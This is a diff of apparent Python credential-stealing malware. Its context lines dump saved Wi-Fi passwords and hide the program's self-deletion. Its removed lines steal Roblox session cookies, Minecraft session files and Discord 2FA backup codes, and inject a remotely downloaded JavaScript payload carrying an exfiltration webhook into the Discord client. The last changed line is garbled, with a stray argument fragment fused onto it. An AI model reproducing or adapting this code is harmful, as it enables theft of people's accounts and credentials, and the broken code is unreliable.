@@ -468,23 +468,6 @@ class Browsers:
         cursor.close()
         conn.close()
 
-    def roblox_cookies(self):
-        robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
-
-        if not __CONFIG__["roblox"]:
-            pass
-        else:
-            robo_cookie = ""
-            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
-                with open(robo_cookie_file, 'w', encoding="utf-8") as f:
-                    for line in g:
-                        if ".ROBLOSECURITY" in line:
-                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
-                            f.write(robo_cookie + "\n\n")
-                    if os.path.getsize(robo_cookie_file) == 0:
-                        f.write("No Roblox Cookies Found")
-
-
 class Wifi:
     def __init__(self):
         self.wifi_list = []
@@ -513,52 +496,6 @@ class Wifi:
             for i, j in self.name_pass.items():
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
-
-
-class Minecraft:
-    def __init__(self):
-        self.roaming = os.getenv("appdata")
-        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
-        self.usercache_path = "\\.minecraft\\usercache.json"
-
-        if os.path.exists(os.path.join(self.roaming, ".minecraft")):
-            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
-            try:
-                self.session_info()
-                self.user_cache()
-            except Exception as e:
-                print(e)
-
-    def session_info(self):
-        with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
-            with open(self.roaming + self.accounts_path, "r") as g:
-                self.session = json.load(g)
-                f.write(json.dumps(self.session, indent=4))
-        f.close()
-
-    def user_cache(self):
-        with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
-            with open(self.roaming + self.usercache_path, "r") as g:
-                self.user = json.load(g)
-                f.write(json.dumps(self.user, indent=4))
-        f.close()
-
-
-class BackupCodes:
-    def __init__(self):
-        self.path = os.environ["HOMEPATH"]
-        self.code_path = '\\Downloads\\discord_backup_codes.txt'
-        self.get_codes()
-
-    def get_codes(self):
-        if os.path.exists(self.path + self.code_path):
-            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
-            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
-                with open(self.path + self.code_path, 'r') as g:
-                    for line in g.readlines():
-                        if line.startswith("*"):
-                            f.write(line)
-            f.close()
 
 
 class AntiSpam:
@@ -601,59 +538,7 @@ class SelfDestruct():
             subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
             os._exit(0)
         else:
-            os.remove(self.path)
-
-
-class Injection:
-    def __init__(self, webhook: str) -> None:
-        self.appdata = os.getenv('LOCALAPPDATA')
-        self.discord_dirs = [
-            self.appdata + '\\Discord',
-            self.appdata + '\\DiscordCanary',
-            self.appdata + '\\DiscordPTB',
-            self.appdata + '\\DiscordDevelopment'
-        ]
-        self.code = requests.get('https://raw.githubusercontent.com/0giv/discord-injection/refs/heads/main/injection.js').text
-
-        for proc in psutil.process_iter():
-            if 'discord' in proc.name().lower():
-                proc.kill()
-
-        for dir in self.discord_dirs:
-            if not os.path.exists(dir):
-                continue
-
-            if self.get_core(dir) is not None:
-                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
-                    self.start_discord(dir)
-
-    def get_core(self, dir: str) -> tuple:
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                modules = dir + '\\' + file + '\\modules'
-                if not os.path.exists(modules):
-                    continue
-                for file in os.listdir(modules):
-                    if re.search(r'discord_desktop_core-+?', file):
-                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
-                        if not os.path.exists(core + '\\index.js'):
-                            continue
-                        return core, file
-
-    def start_discord(self, dir: str) -> None:
-        update = dir + '\\Update.exe'
-        executable = dir.split('\\')[-1] + '.exe'
-
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                app = dir + '\\' + file
-                if os.path.exists(app + '\\' + 'modules'):
-                    for file in os.listdir(app):
-                        if file == executable:
-                            executable = app + '\\' + executable
-                            subprocess.call([update, '--processStart', executable],
-                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            os.remove(self.path)                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 class Debug:
